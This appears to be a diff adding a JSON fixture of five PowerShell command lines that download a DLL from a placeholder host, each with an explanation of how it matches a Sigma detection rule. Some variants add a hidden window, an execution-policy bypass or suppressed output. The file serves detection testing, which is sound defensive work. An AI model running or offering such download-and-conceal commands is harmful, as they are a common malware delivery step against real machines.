@@ -1,0 +1,22 @@
+[
+  {
+    "output": "powershell.exe -Command \"Invoke-WebRequest -Uri http://example.com/test.dll -OutFile test.dll\"",
+    "explanation": "This command matches the Sigma rule by using 'Invoke-WebRequest', including an 'http' URI, and specifying an '.dll' output file. It is a direct match to the detection criteria."
+  },
+  {
+    "output": "powershell.exe -Command \"IWR -Uri http://example.com/test.dll -OutFile test.dll\"",
+    "explanation": "This command uses the shorthand 'IWR' instead of 'Invoke-WebRequest', which is explicitly listed in the Sigma rule's detection criteria. It also includes the required 'http' and '.dll' elements."
+  },
+  {
+    "output": "powershell.exe -Command \"Invoke-WebRequest -Uri http://example.com/test.dll -OutFile test.dll\" -WindowStyle Hidden",
+    "explanation": "This command adds an optional argument '-WindowStyle Hidden' to obscure the PowerShell window, but it still includes all required elements for detection by the Sigma rule."
+  },
+  {
+    "output": "powershell.exe -Command \"Invoke-WebRequest -Uri http://example.com/test.dll -OutFile test.dll\" -ExecutionPolicy Bypass",
+    "explanation": "This command includes an optional execution policy flag, but the core command structure remains unchanged and matches the Sigma rule's detection criteria."
+  },
+  {
+    "output": "powershell.exe -Command \"Invoke-WebRequest -Uri http://example.com/test.dll -OutFile test.dll\" | Out-Null",
+    "explanation": "This command appends a harmless pipeline to suppress output, but the core command still matches the Sigma rule's detection criteria."
+  }
+]
